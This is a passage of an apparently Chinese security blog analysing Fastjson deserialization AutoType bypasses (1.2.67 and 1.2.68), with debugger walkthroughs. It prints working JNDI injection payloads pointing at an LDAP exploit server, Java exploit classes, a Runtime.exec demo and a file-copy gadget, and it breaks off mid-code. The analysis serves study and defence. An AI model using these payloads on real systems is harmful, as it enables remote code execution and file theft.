class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>, <span class="string">&quot;jndiNames&quot;</span>:[<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>], <span class="string">&quot;tm&quot;</span>: &#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.tm&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023873.png" alt="image-20230828002317395"><br>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>,<span class="string">&quot;instance&quot;</span>:&#123;<span class="string">&quot;$ref&quot;</span>:<span class="string">&quot;$.instance&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280023391.png" alt="image-20230828002342936"><br>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass67</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line"><span class="comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot; +  </span></span><br><span class="line"><span class="comment">//                &quot; \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:1099/Exploit\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(poc);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>看一下关键的地方</p><h4 id="org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup"><a href="#org-apache-ignite-cache-jta-jndi-CacheJndiTmLookup" class="headerlink" title="org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup"></a>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</h4><p>根据PoC：<code>&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;, &quot;jndiNames&quot;:[&quot;ldap://localhost:1389/Exploit&quot;], &quot;tm&quot;: &#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;&#125;</code>先调用jndiNames属性的<code>setter</code>方法，注意这里接收参数类型是List，因此构造对应的值需要是数组形式：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024320.png" alt="image-20230828002401114"><br>然后是这里的<code>getTm()</code>函数，回忆一下getter的调用要满足的条件，这个getter并不满足，但是为什么能调用到呢？这里就涉及到了Fastjson循环引用</p><h4 id="Fastjson循环引用"><a href="#Fastjson循环引用" class="headerlink" title="Fastjson循环引用"></a>Fastjson循环引用</h4><p>Fastjson支持循环引用，并且是默认打开的。参考：<a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>在Fastjson中，往JSONArray类型的对象里面add数据时，如果数据相同，那么就会被替换成<code>$ref</code>，也就是被简化了，因为数据一样所以直接指向上一条数据。</p><p><code>$ref</code>即循环引用：当一个对象包含另一个对象时，Fastjson就会把该对象解析成引用。引用是通过<code>$ref</code>标示的。</p><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td><code>&#123;&quot;$ref&quot;:&quot;$&quot;&#125;</code></td><td>引用根对象</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;@&quot;&#125;</code></td><td>引用自己</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;..&quot;&#125;</code></td><td>引用父对象</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;../..&quot;&#125;</code></td><td>引用父对象的父对象</td></tr><tr><td><code>&#123;&quot;$ref&quot;:&quot;$.members[0].reportTo&quot;&#125;</code></td><td>基于路径的引用</td></tr></tbody></table><p>那这样就清楚了，org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC中后面那段的<code>&#123;&quot;$ref&quot;:&quot;$.tm&quot;&#125;</code>，实际上就是基于路径的引用，相当于是调用<code>root.getTm()</code>函数，这个root通常表示整个 JSON 对象的根，进而直接调用了tm字段的<code>getter</code>方法了。</p><h4 id="org-apache-shiro-jndi-JndiObjectFactory"><a href="#org-apache-shiro-jndi-JndiObjectFactory" class="headerlink" title="org.apache.shiro.jndi.JndiObjectFactory"></a>org.apache.shiro.jndi.JndiObjectFactory</h4><p>根据PoC：<code>&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;</code><br>先调用resourceName属性的<code>setter</code>方法设置属性值：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024439.png" alt="image-20230828002421345"><br>往下，就是和前面同理的，通过<code>&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;</code>即循环引用来调用instance的<code>getter</code>方法，其中存在JNDI注入漏洞：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280024820.png" alt="image-20230828002446665"><br>然后这个修复也是加黑名单</p><h2 id="1-2-68漏洞分析（expectClass绕过AutoType）"><a href="#1-2-68漏洞分析（expectClass绕过AutoType）" class="headerlink" title="1.2.68漏洞分析（expectClass绕过AutoType）"></a>1.2.68漏洞分析（expectClass绕过AutoType）</h2><h3 id="前提条件-3"><a href="#前提条件-3" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>Fastjson &lt;&#x3D; 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>本次绕过<code>checkAutoType()</code>函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作。<br>简单地说，本次绕过<code>checkAutoType()</code>函数的攻击步骤为：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入<code>checkAutoType()</code>函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或<code>setter</code>方法中存在危险操作则可以被攻击利用；</li></ol><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(cmd);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">            &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass68</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;bypass.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无需开启AutoType，直接成功绕过<code>CheckAutoType()</code>的检测从而触发执行：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025028.png" alt="image-20230828002512553"></p><h3 id="调试分析-2"><a href="#调试分析-2" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里直接在checkAutoType函数下断点，看看怎么绕过的<br>第一次是传入java.lang.AutoCloseable类进行校验，这里<code>CheckAutoType()</code>函数的expectClass参数是为null的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280025524.png" alt="image-20230828002535960"><br>然后继续往下，从缓存 Mapping 中获取到了 <code>AutoCloseable</code> 类赋值给 <code>clazz</code> 后再进行了一系列的判断，<code>clazz</code> 是否为 null，以及关于 internalWhite 的判断，internalWhite 就是内部加白的名单，很显然我们这里肯定不是，内部加白的名单一定是非常安全的。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026336.png" alt="image-20230828002602765"><br>然后后面这个判断里面出现了 <code>expectClass</code>，先判断 <code>clazz</code> 是否不是 <code>expectClass</code> 类的继承类且不是 <code>HashMap</code> 类型，是的话抛出异常，否则直接返回该类。<br>我们这里没有 <code>expectClass</code>，所以会直接返回 <code>AutoCloseable</code> 类：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026753.png" alt="image-20230828002621537"><br>接着，返回到 <code>DefaultJSONParser</code> 类中获取到 <code>clazz</code> 后再继续执行，根据 <code>AutoCloseable</code> 类获取到反序列化器为 <code>JavaBeanDeserializer</code>，然后应用该反序列化器进行反序列化操作：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026859.png" alt="image-20230828002641320"><br>然后进入deserialze这里，调用的是 <code>JavaBeanDeserializer</code> 的 <code>deserialze()</code> 方法进行反序列化操作，其中 type 参数就是传入的 <code>AutoCloseable类</code>，如图：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280026841.png" alt="image-20230828002657296"><br>往下的逻辑，就是解析获取 PoC 后面的类的过程。这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027403.png" alt="image-20230828002726832"><br>此时，第二次进入 <code>checkAutoType()</code> 函数，typeName 参数是 PoC 中第二个指定的类，expectClass 参数则是 PoC 中第一个指定的类<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280027037.png" alt="image-20230828002751466"><br>往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028627.png" alt="image-20230828002810033"><br>往下，由于expectClassFlag为true且目标类不在内部白名单中，程序进入AutoType开启时的检测逻辑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028295.png" alt="image-20230828002835724"><br>由于org.example.VulAutoCloseable类不在黑白名单中，因此这段能通过检测并继续往下执行。<br>往下，未加载成功目标类，就会进入AutoType关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280028628.png" alt="image-20230828002854090"><br>往下，由于expectClassFlag为true，进入如下的<code>loadClass()</code>逻辑来加载目标类，但是由于AutoType关闭且jsonType为false，因此调用<code>loadClass()</code>函数的时候是不开启cache即缓存的<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029096.png" alt="image-20230828002912531"><br>跟进该函数，使用AppClassLoader加载org.example.VulAutoCloseable类并直接返回：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029024.png" alt="image-20230828002929465"><br>往下，判断是否jsonType，true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280029497.png" alt="image-20230828002952920"><br>前面的都能通过，往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，<strong>这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类、因此恶意类必须是AutoCloseable类的子类才能通过这里的判断</strong>：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030610.png" alt="image-20230828003010006"><br><code>checkAutoType()</code>调用完返回类之后，就进行反序列化操作、新建恶意类实例进而调用其构造函数从而成功触发漏洞：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280030655.png" alt="image-20230828003031002"><br>小结：<br>第一个 <code>@type</code> 是作为第二个指定的类里面的 expectClass，并且需要加载的目标类是expectClass类的子类或者实现类这就是构造恶意类为什么VulAutoCloseable(继承或者)实现AutoCloseable类 （不在黑名单中），当传入<code>checkAutoType()</code>函数的expectClass参数不为null，并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中），就将需要加载的目标类当做是正常的类然后通过调用<code>TypeUtils.loadClass()</code>函数进行加载。</p><h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><p>这里就是找一下实际中可利用的类，因为上面是自己构造的验证一下可行性<br>寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现了AutoCloseable接口的。<br>大佬寻找 gadget 时的条件是这样的。</p><ul><li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</li><li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte<code>[]</code>、ByteBuffer、String、char<code>[]</code>其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</li><li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法<br>以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。<br>分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。</li></ul><h4 id="复制文件（任意文件读取漏洞）"><a href="#复制文件（任意文件读取漏洞）" class="headerlink" title="复制文件（任意文件读取漏洞）"></a>复制文件（任意文件读取漏洞）</h4><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong><br>依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">1.9</span><span class="number">.5</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>看下SafeFileOutputStream类的源码，其<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> File temp;</span><br><span class="line">    <span class="keyword">protected</span> File target;</span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);</span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.commit();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.target.delete();</span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);</span><br><span class="line">            <span class="built_in">this</span>.temp.delete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">BufferedOutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));</span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));</span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);</span><br><span class="line">                    destination.close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    FileUtil.safeClose(source);</span><br><span class="line">                    FileUtil.safeClose(destination);</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;</span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.output.write(b);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var3) &#123;</span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp如下，这里不得不说依赖导的真慢，我下载地址都换成了国内的了还这么慢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 